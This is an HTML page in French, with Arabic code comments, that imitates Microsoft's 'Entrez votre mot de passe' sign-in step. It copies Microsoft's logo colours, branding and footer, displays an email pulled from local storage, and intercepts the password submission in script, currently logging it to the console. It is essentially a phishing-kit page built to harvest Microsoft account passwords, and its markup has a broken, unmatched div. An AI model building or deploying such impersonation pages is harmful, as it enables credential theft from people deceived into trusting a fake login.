<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrez votre mot de passe</title>
    <style>
        /* إعدادات شاملة وتصفير الأبعاد */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', -apple-system, Roboto, Helvetica, sans-serif;
        }

        body {
            background: radial-gradient(circle at 80% 20%, #e5eef9 0%, #f3f5f8 50%, #eddfe9 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
        }

        .ms-v3-spacer {
            flex: 1;
        }

        /* الصندوق الأبيض الرئيسي المستدير الزوايا */
        .ms-v3-card {
            background: #ffffff;
            width: 100%;
            max-width: 440px;
            padding: 44px;
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
            display: flex;
            flex-direction: column;
        }

        /* القسم العلوي: السهم والشعار */
        .ms-v3-header {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }

        .ms-v3-back {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 32px;
            height: 32px;
            border-radius: 50%;
            margin-right: 16px;
            text-decoration: none;
            cursor: pointer;
        }

        .ms-v3-back:hover {
            background-color: rgba(0, 0, 0, 0.05);
        }

        .ms-v3-logo-box {
            display: flex;
            align-items: center;
        }

        .ms-v3-squares {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 2px;
            width: 21px;
            height: 21px;
            margin-right: 12px;
        }

        .ms-v3-squares span { display: block; }
        .ms-v3-r { background-color: #f25022; } 
        .ms-v3-g { background-color: #7fba00; } 
        .ms-v3-b { background-color: #00a4ef; } 
        .ms-v3-y { background-color: #ffb900; }

        .ms-v3-brand {
            font-size: 16px;
            font-weight: 600;
            color: #737373;
        }

        /* عرض اسم المستخدم المكتوب في الخطوة الأولى */
        .ms-v3-identity {
            font-size: 15px;
            color: #1b1b1b;
            margin-bottom: 16px;
            word-break: break-all;
        }

        h2 {
            color: #1b1b1b;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 20px;
            text-align: left;
        }

        /* حقول الإدخال المقيدة تماماً داخل الصندوق */
        .ms-v3-input-wrapper {
            margin-bottom: 20px;
            width: 100%;
        }

        .ms-v3-input-wrapper fieldset {
            border: 1px solid #666666;
            border-radius: 4px;
            padding: 0 12px;
        }

        .ms-v3-input-wrapper fieldset:focus-within {
            border-color: #0067b8;
        }

        .ms-v3-input-wrapper legend {
            font-size: 12px;
            color: #666666;
            padding: 0 4px;
            margin-left: 8px;
        }

        .ms-v3-input-row {
            display: flex;
            align-items: center;
            width: 100%;
        }

        input[type="password"], input[type="text"] {
            width: 100%;
            border: none;
            outline: none;
            padding: 10px 0;
            font-size: 16px;
            background: transparent;
        }

        .ms-v3-toggle-eye {
            background: none;
            border: none;
            cursor: pointer;
            padding: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* الزر الأزرق العريض الممتد على كامل العرض والمحتوى بالداخل */
        .ms-v3-btn-submit {
            width: 100%;
            background-color: #0067b8;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            padding: 10px 20px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 24px;
            text-align: center;
        }

        .ms-v3-btn-submit:hover {
            background-color: #005da6;
        }

        .ms-v3-alt-links {
            text-align: left;
            font-size: 13px;
        }

        .ms-v3-alt-links a {
            color: #0067b8;
            text-decoration: none;
        }

        .ms-v3-alt-links a:hover {
            text-decoration: underline;
        }

        /* تذييل الصفحة في الأسفل خارج إطار الصندوق */
        .ms-v3-footer-box {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            align-items: center;
            width: 100%;
            padding: 20px 0 12px 0;
        }

        .ms-v3-footer-links {
            display: flex;
            justify-content: center;
            gap: 16px;
            margin-bottom: 6px;
            flex-wrap: wrap;
        }

        .ms-v3-footer-links a, .ms-v3-footer-note {
            color: #666666;
            font-size: 11px;
            text-decoration: none;
        }

        .ms-v3-footer-links a:hover {
            text-decoration: underline;
        }

        .ms-v3-footer-note {
            text-align: center;
            max-width: 90%;
        }
    </style>
</head>
<body>

    <div class="ms-v3-spacer"></div>

    <!-- الصندوق المغلق بإحكام لتجنب خروج العناصر لأسفل الصفحة -->
    <div class="ms-v3-card">
        
        <div class="ms-v3-header">
            <a href="index.html" class="ms-v3-back" aria-label="Retour">
                <svg viewBox="0 0 24 24" width="20" height="20">
                    <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z" fill="#1b1b1b"/>
                </svg>
            </a>
            <div class="ms-v3-logo-box">
                <div class="ms-v3-squares">
                    <span class="ms-v3-r"></span><span class="ms-v3-g"></span>
                    <span class="ms-v3-b"></span><span class="ms-v3-y"></span>
                </div>
                <span class="ms-v3-brand">Microsoft</span>
            </div>
        </div>

        
            <span id="display-user-email"></span>
        </div>

        <h2>Entrez votre mot de passe</h2>

        <form id="ms-v3-password-form">
            <div class="ms-v3-input-wrapper">
                <fieldset>
                    <legend>Mot de passe</legend>
                    <div class="ms-v3-input-row">
                        <input type="password" id="password-input-field" required autocomplete="off">
                        <button type="button" class="ms-v3-toggle-eye" id="password-eye-toggle" aria-label="Afficher le mot de passe">
                            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#666" stroke-width="2">
                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </button>
                    </div>
                </fieldset>
            </div>

            <button type="submit" class="ms-v3-btn-submit">Suivant</button>
        </form>

        <div class="ms-v3-alt-links">
            <a href="#">Autres méthodes pour se connecter</a>
        </div>

    </div>

    <!-- التذييل المستقل في أسفل الصفحة تماماً -->
    <div class="ms-v3-footer-box">
        <div class="ms-v3-footer-links">
            <a href="#">Aide et commentaires</a>
            <a href="#">Conditions d'utilisation</a>
            <a href="#">Confidentialité et cookies</a>
        </div>
        <div class="ms-v3-footer-note">
            Utilisez la navigation privée s'il ne s'agit pas de votre appareil. <a href="#" style="color:#0067b8;">Découvrir plus d'informations</a>
        </div>
    </div>

    <script>
        // جلب اسم المستخدم وعرضه تلقائياً
        document.addEventListener('DOMContentLoaded', function() {
            const savedEmailValue = localStorage.getItem('user_email') || 'hkvvvjkvvh';
            document.getElementById('display-user-email').textContent = savedEmailValue;
            document.getElementById('password-input-field').focus();
        });

        // تشغيل ميزة إظهار العين للتحويل بين نص وكلمة سر
        const eyeTrigger = document.getElementById('password-eye-toggle');
        const passwordField = document.getElementById('password-input-field');
        
        eyeTrigger.addEventListener('click', function() {
            if (passwordField.type === "password") {
                passwordField.type = "text";
            } else {
                passwordField.type = "password";
            }
        });

        // اعتراض عملية الإرسال
        document.getElementById('ms-v3-password-form').addEventListener('submit', function(e) {
            e.preventDefault();
            console.log('Submitted:', passwordField.value);
        });
    </script>
</body>
</html>
